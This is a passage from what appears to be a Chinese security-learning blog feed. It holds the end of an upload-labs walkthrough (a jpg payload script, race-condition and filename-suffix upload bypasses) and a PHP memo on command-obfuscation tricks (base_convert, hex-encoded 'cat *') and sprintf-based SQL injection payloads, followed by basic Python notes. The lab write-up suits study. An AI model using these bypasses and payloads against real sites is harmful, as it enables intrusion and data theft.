&#125;</span><br><span class="line">            <span class="keyword">return</span> $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后执行命令<code>php jpg_payload.php 1.jpg</code></p><p>显示<code>Success!</code>即成功，装换后的文件名为<code>payload_1.jpg</code></p><p>将<code>payload_1.jpg</code>上传，php代码成功被解析</p><h3 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h3><p>条件竞争，利用burp的intruder模块，不停的发送数据包，就可以连接上，我硬是开了3个intruder模块才访问的到网页</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Upload-labs%E9%9D%B6%E5%9C%BA/image-20200209211644172.png" alt=""></p><h3 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h3><p>同样条件竞争，让发包的速度快过函数rename()的速度即可成功上传</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Upload-labs%E9%9D%B6%E5%9C%BA/image-20200209212552816.png" alt=""></p><h3 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h3><p>保存名称那里在后缀，名加上一个<code>/.</code> 、<code>.(空格)</code>或<code>.</code>；<code>move_uploaded_file()</code>还有一个特性，会忽略掉文件末尾的<code>.</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Upload-labs%E9%9D%B6%E5%9C%BA/image-20200209213807846.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> uploads </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些PHP函数</title>
      <link href="/2020/02/06/%E4%B8%80%E4%BA%9BPHP%E5%87%BD%E6%95%B0/"/>
      <url>/2020/02/06/%E4%B8%80%E4%BA%9BPHP%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="绕过函数"><a href="#绕过函数" class="headerlink" title="绕过函数"></a>绕过函数</h2><h3 id="base-convert"><a href="#base-convert" class="headerlink" title="base_convert"></a>base_convert</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/一些PHP函数/image-20200206145300281.png" style="zoom:67%;" /><p>可用以绕过执行一些系统命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert(<span class="string">'phpinfo'</span>,<span class="number">36</span>,<span class="number">10</span>) ==&gt; <span class="number">55490343972</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert(<span class="number">55490343972</span>,<span class="number">10</span>,<span class="number">36</span>)() ==&gt; phpinfo()</span><br></pre></td></tr></table></figure><h3 id="hex2bin"><a href="#hex2bin" class="headerlink" title="hex2bin"></a>hex2bin</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/一些PHP函数/image-20200206150504686.png" style="zoom:67%;" /><h3 id="dechex"><a href="#dechex" class="headerlink" title="dechex"></a>dechex</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/一些PHP函数/image-20200206150752364.png" style="zoom:67%;" /><h3 id="hexdec"><a href="#hexdec" class="headerlink" title="hexdec"></a>hexdec</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/一些PHP函数/image-20200206151951567.png" style="zoom:67%;" /><p>例：cat *的16进制为636174202a</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdec(<span class="number">636174202</span>a) ==&gt; <span class="number">426836762666</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hex2bin(dechex(<span class="number">426836762666</span>)) ==&gt; cat *</span><br></pre></td></tr></table></figure><h2 id="读取数据函数"><a href="#读取数据函数" class="headerlink" title="读取数据函数"></a>读取数据函数</h2><h3 id="scandir"><a href="#scandir" class="headerlink" title="scandir"></a>scandir</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/一些PHP函数/image-20200206153405574.png" style="zoom:67%;" /><h3 id="readfile"><a href="#readfile" class="headerlink" title="readfile"></a>readfile</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/一些PHP函数/image-20200206153545427.png" style="zoom:67%;" /><h3 id="chr"><a href="#chr" class="headerlink" title="chr"></a>chr</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/一些PHP函数/image-20200206154027139.png" style="zoom:67%;" /><h3 id="var-dump"><a href="#var-dump" class="headerlink" title="var_dump"></a>var_dump</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/一些PHP函数/image-20200206154243939.png" style="zoom:67%;" /><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(chr(<span class="number">47</span>)))    读取当前目录文件</span><br></pre></td></tr></table></figure><h3 id="show-source"><a href="#show-source" class="headerlink" title="show_source"></a>show_source</h3><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E4%B8%80%E4%BA%9BPHP%E5%87%BD%E6%95%B0/image-20200315185811823.png" alt=""></p><p>可现显示php代码，用于<code>data://</code>协议中来读取代码</p><h2 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h2><h3 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h3><p><code>int strcmp(string $str1, string $str2)</code></p><p><code>str1</code>为第一个字符串，<code>str2</code>为第二个字符串，如果<code>str1</code>小于<code>str2</code>返回<code>&lt;0</code>如果<code>str1</code>大于<code>str2</code>返回<code>&gt;0</code>；如果二者相等，返回<code>0</code></p><p>但是当我们传入数组的时候，函数接收到不合法的字符后会报错，但是在php5.3之前的php中，显示了报错的警告信息后将<code>return 0</code>；意思是就算报了错，但判定结果还是相等的，即可通过数组进行绕过</p><h3 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric"></a>is_numeric</h3><p>函数检测变量是否为数字或数字字符串，是则返回<code>true</code>，否则返回<code>false</code>，但是该函数对于空字符（如：<code>%00</code>，<code>%20</code>）则会直接跳过空字符判断，执行后面的语句，是判断则会接着继续后面的判断，注：<code>%20</code>放在字符串首则无效，例：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E4%B8%80%E4%BA%9BPHP%E5%87%BD%E6%95%B0/image-20200229210728123.png" alt=""></p><h3 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf()"></a>sprintf()</h3><p>参考：<a href="http://bey0nd.xyz/2018/11/05/1/" target="_blank" rel="noopener">http://bey0nd.xyz/2018/11/05/1/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sprintf(format,arg1,arg2,arg++)</span><br><span class="line">arg1、arg2、arg++ 参数将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个 % 符号处，插入 arg1，在第二个 % 符号处，插入 arg2，依此类推。</span><br><span class="line">注释：如果 % 符号多于 arg 参数，则您必须使用占位符。占位符位于 % 符号之后，由数字和 &quot;\$&quot; 组成。</span><br></pre></td></tr></table></figure><p><strong>反斜杠单引号逃逸</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sql = <span class="string">"select * from user where username = '%\' and 1=1#';"</span> ;</span><br><span class="line">$args = <span class="string">"admin"</span> ;</span><br><span class="line"><span class="keyword">echo</span>  sprintf ( $sql , $args ) ;</span><br></pre></td></tr></table></figure><p>=&gt; <code>echo sprintf(&quot;select * from user where username = &#39;%\&#39; and 1=1#&#39;;&quot;, &quot;admin&quot;);</code><br>此时%\回去匹配admin字符串，但是<code>%\</code>只会匹配空<br>运行后的结果<br><code>select * from user where username = &#39;&#39; and 1=1#&#39;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$input = addslashes (<span class="string">"%1$' and 1=1#"</span> );</span><br><span class="line">$b = sprintf (<span class="string">"AND b='%s'"</span>, $input );</span><br><span class="line">$sql = sprintf (<span class="string">"SELECT * FROM t WHERE a='%s' $b "</span>, <span class="string">'admin'</span> );</span><br></pre></td></tr></table></figure><p>对<code>$input</code>与<code>$b</code>进行了拼接<br><code>$sql = sprintf (&quot;SELECT * FROM t WHERE a=&#39;%s&#39; AND b=&#39;%1$\&#39; and 1=1#&#39; &quot;, &#39;admin&#39; );</code><br>很明显，这个句子里面的<code>\</code>是由<code>addsashes</code>为了转义单引号而加上的，使用<code>%s</code>与<code>%1$\</code>类匹配<code>admin</code>，那么<code>admin</code>只会出现在<code>%s</code>里，<code>%1$\</code>为空<br><code>echo  $sql ;</code><br>运行后的结果<br><code>SELECT * FROM t WHERE a=&#39;admin&#39; AND b=&#39;&#39; and 1=1#&#39;</code></p><p><strong>%c利用</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line">$input1 = <span class="string">'%1$c) OR 1 = 1 /*'</span> ;</span><br><span class="line">$input2 = <span class="number">39</span> ;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM foo WHERE bar IN (' $input1 ') AND baz = %s"</span> ;</span><br><span class="line">$sql = sprintf ( $sql , $input2 );</span><br><span class="line"><span class="keyword">echo</span>  $sql ;</span><br></pre></td></tr></table></figure><p><code>%c</code>起到了类似<code>chr()</code>的效果，将数字39转化为<code>&#39;</code>，从而导致了sql注入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> foo <span class="keyword">WHERE</span> bar <span class="keyword">IN</span> (<span class="string">''</span>) <span class="keyword">OR</span> <span class="number">1</span> = <span class="number">1</span> <span class="comment">/*) AND baz = 39</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python笔记</title>
      <link href="/2020/02/01/python%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/02/01/python%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="运算函数"><a href="#运算函数" class="headerlink" title="运算函数"></a>运算函数</h2><table><thead><tr><th align="center">函数</th><th align="center">作用</th><th align="center">例</th></tr></thead><tbody><tr><td align="center">abs(x)</td><td align="center">绝对值函数</td><td align="center">abs(-1) = 1</td></tr><tr><td align="center">divmod(x,y)</td><td align="center">商余函数</td><td align="center">divmod(10,3) = (3,1)</td></tr><tr><td align="center">pow(x,y,z)</td><td align="center">幂运算函数</td><td align="center">pow(2,2) = 4,pow(2,2,3) = 1</td></tr><tr><td align="center">round(x)</td><td align="center">四舍五入函数</td><td align="center">round(1.5) = 2</td></tr><tr><td align="center">max(x)</td><td align="center">最大值函数</td><td align="center">max(1,2,3) = 3</td></tr><tr><td align="center">min(x)</td><td align="center">最小值函数</td><td align="center">min(1,2,3) = 1</td></tr></tbody></table><h2 id="字符串处理函数"><a href="#字符串处理函数" class="headerlink" title="字符串处理函数"></a>字符串处理函数</h2><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">len(x)</td><td align="center">返回字符串x的长度，len(“壹1,\‘ a”) = 6</td></tr><tr><td align="center">str(x)</td><td align="center">任意类型x所对应的字符串形式,str(‘abc123’)=abc123,与eval()形成对比</td></tr><tr><td align="center">hex(x)或oct(x)</td><td align="center">整数x的十六进制或八进制小写形式的字符串，hex(111)=’0x6f’,oct(111)=’0o157’</td></tr><tr><td align="center">chr(x)</td><td align="center">x为Unicode编码，返回其对应的字符，chr(20197) = ‘以’</td></tr><tr><td align="center">ord(x)</td><td align="center">x为字符，返回其对应的Unicode编码，ord(“以”) = 20197</td></tr></tbody></table><blockquote><p><strong>输入为小数字符串，转换成int型方法：<code>a = int(float(a))</code></strong></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>):</span><br><span class="line">print(chr(<span class="number">9800</span> + i),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p>♈♉♊♋♌♍♎♏♐♑♒♓</p><h2 id="字符串处理方法"><a href="#字符串处理方法" class="headerlink" title="字符串处理方法"></a>字符串处理方法</h2><table><thead><tr><th align="center">方法及使用</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">str.lower()或str.upper()</td><td align="center">返回字符串的副本，全部字符小写/大写 “AbCdEfGh”.lower()结果为“abcdefgh”</td></tr><tr><td align="center">str.split(sep=None)</td><td align="center">返回一个列表，由str根据sep被分隔的部分组成 “A,B,C”.split(“,”)结果为[‘A’,’B’,’C’]</td></tr><tr><td align="center">str.count(sub)</td><td align="center">返回子串sub在str中出现的次数  “a apple a day”.count(“a”)结果为4</td></tr><tr><td align="center">str.replace(old,new)</td><td align="center">返回字符串str副本，所有old子串被替换为new “python”.replace(“n”,”n123”)结果为‘python123’</td></tr><tr><td align="center">str.center(width[,fillchar])</td><td align="center">字符串str根据宽度width居中fillchar可选 “python”.center(20,”=”) 结果为‘=======python=======’</td></tr><tr><td align="center">str.strip(chars)</td><td align="center">从str中去掉在其左侧和右侧chars中列出的字符 “= python=”.strip(“ =np”)结果为 ‘ytho’</td></tr><tr><td align="center">str.join(iter)</td><td align="center">在iter变量除最后元素外每个元素后增加一个 str”,”.join(“12345”)结果为’1,2,3,4,5’ 主要用于字符串分隔等</td></tr><tr><td align="center">str.isdigit()</td><td align="center">判断接收的字符是否为数字，返回True或False，无参数</td></tr></tbody></table><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p>即程序报错执行except的语句</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200204172105285.png" style="zoom:67%;" /><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200204172853121.png" style="zoom:67%;" /><p>异常类型详见：<a href="https://www.runoob.com/python/python-exceptions.html" target="_blank" rel="noopener">Python 异常处理</a></p><h2 id="随机数函数"><a href="#随机数函数" class="headerlink" title="随机数函数"></a>随机数函数</h2><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">randint(a,b)</td><td align="center">生成一个[a,b]之间的整数&gt;&gt;&gt;random.randint(10,100)=64</td></tr><tr><td align="center">randrange(m,n[,k])</td><td align="center">生成一个[m,n)之间以k为步长的随机整数&gt;&gt;&gt;random.randrange(10,100,10)=80</td></tr><tr><td align="center">getrandbits(k)</td><td align="center">生成一个k比特长的随机整数&gt;&gt;&gt;random.getrandbits(16)=37885</td></tr><tr><td align="center">uniform(a,b)</td><td align="center">生成一个[a,b]之间的随机小数&gt;&gt;&gt;random.uniform(10,100)=13.234563456</td></tr><tr><td align="center">choice(seq)</td><td align="center">从序列seq中随机选择一个元素&gt;&gt;&gt;random.choice([1,2,3,4,5,6,7,8,9,0])=5</td></tr><tr><td align="center">shuffle(seq)</td><td align="center">将序列seq中元素随机排序，返回打乱后的序列                             &gt;&gt;&gt;s=[1,2,3,4];random.shuffle(s);print(s)   [3,1,4,2]</td></tr></tbody></table><blockquote><p>global：在函数内部声明全局变量</p></blockquote><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>阶乘：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">1</span>: <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> (x * a(x<span class="number">-1</span>))</span><br></pre></td></tr></table></figure><p>求和</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">1</span>: <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> (x + a(x<span class="number">-1</span>))</span><br></pre></td></tr></table></figure><p>汉诺塔问题求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hanoi</span><span class="params">(n,src,dst,mid)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> count</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">"&#123;&#125;:&#123;&#125;-&gt;&#123;&#125;"</span>.format(<span class="number">1</span>,src,dst))</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        hanoi(n<span class="number">-1</span>,src,mid,dst)</span><br><span class="line">        print(<span class="string">"&#123;&#125;:&#123;&#125;-&gt;&#123;&#125;"</span>.format(n,src,dst))</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        hanoi(n<span class="number">-1</span>,mid,dst,src)</span><br><span class="line">hanoi(<span class="number">5</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>)</span><br><span class="line">print(count)</span><br></pre></td></tr></table></figure><p>科赫曲线雪花绘制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">koch</span><span class="params">(size,n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        turtle.fd(size)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> angle <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">60</span>,<span class="number">-120</span>,<span class="number">60</span>]:</span><br><span class="line">            turtle.left(angle)</span><br><span class="line">            koch(size/<span class="number">3</span>,n<span class="number">-1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    turtle.setup(<span class="number">1200</span>,<span class="number">800</span>)</span><br><span class="line">    turtle.penup()</span><br><span class="line">    turtle.goto(<span class="number">-300</span>,<span class="number">100</span>)</span><br><span class="line">    turtle.pendown()</span><br><span class="line">    turtle.pensize(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        koch(<span class="number">300</span>,<span class="number">3</span>)  <span class="comment">#2阶科赫曲线，阶数</span></span><br><span class="line">        turtle.right(<span class="number">120</span>)</span><br><span class="line">    turtle.hideturtle()</span><br><span class="line">    turtle.done()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="集合处理方法"><a href="#集合处理方法" class="headerlink" title="集合处理方法"></a>集合处理方法</h2><table><thead><tr><th align="center">操作函数或方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">S.add(x)</td><td align="center">如果x不在集合S中，将x增加到S</td></tr><tr><td align="center">S.discard(x)</td><td align="center">移除S中元素x，如果不在集合S中，不报错</td></tr><tr><td align="center">S.remove()</td><td align="center">移除S中元素x，如果x不在集合S中，产生KeyError异常</td></tr><tr><td align="center">S.clear()</td><td align="center">移除S中的所有元素</td></tr><tr><td align="center">S.pop()</td><td align="center">随机<strong>返回</strong>S中的一个元素，<strong>更新</strong>S，若S为空产生KeyError异常</td></tr><tr><td align="center">S.copy()</td><td align="center">返回集合S中的一个副本</td></tr><tr><td align="center">len(S)</td><td align="center">返回集合S的元素个数</td></tr><tr><td align="center">x in S</td><td align="center">判断S中元素x，x在集合S中，返回True，否则返回False</td></tr><tr><td align="center">x not in S</td><td align="center">判断S中元素x，x不在集合S中，返回False，否则返回True</td></tr><tr><td align="center"><code>set(x)</code></td><td align="center">将其他类型变量x转变为<code>集合</code>类型，可用以集合元素去重</td></tr><tr><td align="center"><code>list(x)</code></td><td align="center">转换为<code>列表</code>类型</td></tr><tr><td align="center"><code>tuple(x)</code></td><td align="center">转换为<code>元组</code>类型</td></tr></tbody></table><h2 id="序列"><a href="#序列" class="headerlink" title="序列"></a>序列</h2><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200205173145060.png" style="zoom:67%;" /><table><thead><tr><th align="center">函数和方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">len(s)</td><td align="center">返回序列s的长度</td></tr><tr><td align="center">min(s)</td><td align="center">返回序列s的最小元素，s中元素需要可比较</td></tr><tr><td align="center">max(s)</td><td align="center">返回序列s的最大元素，s中元素需要可比较</td></tr><tr><td align="center">s.index(x)或s.index(x,i,j)</td><td align="center">返回序列s从i开始到j位置中第一次出现元素x的位置</td></tr><tr><td align="center">s.count(x)</td><td align="center">返回序列s中出现x的总次数</td></tr></tbody></table><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200205175031008.png" style="zoom:67%;" /><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200205175315482.png" style="zoom:67%;" /><blockquote><p>sorted()：对列表进行排序（小到大）</p></blockquote><h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>使用<code>{}</code>和<code>dict{}</code>给变量赋值创建，键值对之间用<code>:</code>分隔，d[key]可以进行索引也可用于赋值，但在进行赋值的时候只能啊<code>a[1] = a[2]</code>这样赋值，不能<code>1 = a[1]</code>、a[i]代表的是i这个键对应的值，无法直接修改值的键，如果要对键操作需要将这个键删除（即<code>(del a[i])</code>），然后再将这个值赋给一个新的键。</p><p><code>update()</code>方法，在字典中添加键值对，也可以直接赋值添加</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/image-20200216101507795.png" alt=""></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200205184557293.png" style="zoom:67%;" /><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200205184654602.png" style="zoom:67%;" /><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200207164533879.png" style="zoom:67%;" /><p>文件读取方法：<code>read()</code>,<code>readline()</code>,<code>readlines()</code>,在入方法：<code>write()</code>,<code>writelines()</code></p><p>二维数据的处理：<code>for</code>循环+<code>.split()</code>和<code>.join()</code></p><p>三国演义人物出场词频统计</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line">txt = open(<span class="string">"三国演义.txt"</span>,<span class="string">"r"</span>,encoding=<span class="string">"utf-8"</span>).read()</span><br><span class="line">words = jieba.lcut(txt)  <span class="comment">#lcut精确模式，返回一列表类型</span></span><br><span class="line">counts = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> words:</span><br><span class="line">    <span class="keyword">if</span> len(word) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        counts[word] = counts.get(word,<span class="number">0</span>) + <span class="number">1</span>    <span class="comment">#字典类型中'='为创造一个键值对，亦可进行赋值操作</span></span><br><span class="line">items = list(counts.items()) <span class="comment">#items方法为返回字典中所有的键值对信息</span></span><br><span class="line">items.sort(key = <span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    word,count = items[i]</span><br><span class="line">    print(<span class="string">"&#123;0:&lt;10&#125;&#123;1:&gt;5&#125;"</span>.format(word,count))</span><br></pre></td></tr></table></figure><h2 id="yield"><a href="#yield" class="headerlink" title="yield"></a>yield</h2><p>生成器<a href="https://blog.csdn.net/mieleizhi0522/article/details/82142856/" target="_blank" rel="noopener">参考</a></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200217193657638.png" style="zoom:67%;" /><h2 id="is"><a href="#is" class="headerlink" title="is"></a>is</h2><p>在Pytohn中，进行数值比较时会用到 <code>==</code> 运算符，判断两个变量的地址是否相同用 <code>is</code> 关键字</p><p>如下列比较操作</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/image-20200406163737563.png" alt=""></p><h2 id="pass"><a href="#pass" class="headerlink" title="pass"></a>pass</h2><p>Python pass 是空语句，是为了保持程序结构的完整性。</p><p><strong>pass</strong> 不做任何事情，一般用做占位语句。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sample</span><span class="params">(n_samples)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>该处的 pass 便是占据一个位置，因为如果定义一个空函数程序会报错，当你没有想好函数的内容是可以用 pass 填充，使程序可以正常运行。</p><h2 id="u-r-b-f"><a href="#u-r-b-f" class="headerlink" title="u,r,b,f"></a>u,r,b,f</h2><p>在字符串前面为了能够更好的识别字符串处理方式，于是在字符串前面加上这些标识符来识别</p><ul><li>u：后面字符串以 Unicode 格式 进行编码，一般用在中文字符串前面，防止因为源码储存格式问题，导致再次使用时出现乱码。</li><li>r：去掉反斜杠的转义机制。常用于re模块</li><li>b：后面字符串是bytes 类型。在网络编程中，服务器和浏览器只认bytes 类型数据。</li><li>f：字符串内支持大括号内的python 表达式</li></ul><h2 id="和"><a href="#和" class="headerlink" title="*和**"></a><code>*</code>和<code>**</code></h2><p>这两种用法可以将<strong>任意个数</strong>的参数导入到python函数中</p><p>单星号<code>（*）</code>：<code>*agrs</code> 将所有参数以<strong>元组(tuple)</strong>的形式导入，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(str1,*str2)</span>:</span></span><br><span class="line">    print(str1)</span><br><span class="line">    print(str2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">(str1,str2)</span>:</span></span><br><span class="line">    print(str1)</span><br><span class="line">    print(str2)</span><br><span class="line">k = [<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">a(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>)</span><br><span class="line">b(*k)   <span class="comment">#解压参数列表</span></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line">(<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span 